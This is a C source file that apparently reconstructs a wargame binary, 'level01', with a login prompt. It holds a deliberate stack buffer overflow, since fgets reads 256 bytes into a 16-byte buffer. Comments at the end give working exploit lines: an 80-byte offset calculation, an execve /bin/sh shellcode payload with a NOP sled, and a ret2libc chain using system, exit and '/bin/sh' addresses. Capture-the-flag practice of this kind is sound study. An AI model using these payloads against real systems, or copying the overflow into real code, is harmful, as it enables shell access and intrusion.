#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int verify_user_name(char *str)
{
	puts("verifying username....\n");
	return (strncmp("dat_wil", str, 7)); // 0x7
}

int verify_user_pass(char *str)
{
	return (strncmp("admin", str, 5)); // 0x5
}

int main(void)
{
	char	str[16];
	bzero(str, 16);
	
	puts("********* ADMIN LOGIN PROMPT *********");
	printf("Enter Username: ");
	fgets(str, 256, stdin); // 0x100

	if (verify_user_name(str) != 0)
	{
		puts("nope, incorrect username...\n");
		return (1);
	}

	puts("Enter Password: ");
	fgets(str, 100, stdin); // 0x64

	int ret = verify_user_pass(str);
	if (ret == 0)
	{
		puts("nope, incorrect password...\n");
		return (1);
	}

	if (ret == 0)
		return (0);
}

// get eip after password fgets 0xffffd71c
// calculate offset -> 0xffffd71c - 0xffffd6cc = 80

// execve shell
// (python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n' + 80 * '\x90' + '\x47\xa0\x04\x08'"; cat) | ./level01



// ret2libc
// find system function address 0xf7e6aed0
// find exit function address 0xf7e5eb70
// find string "/bin/sh" address 0xf7f897ec
// (python -c "print 'dat_wil' + '\n' + 80 * '\x90' + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level01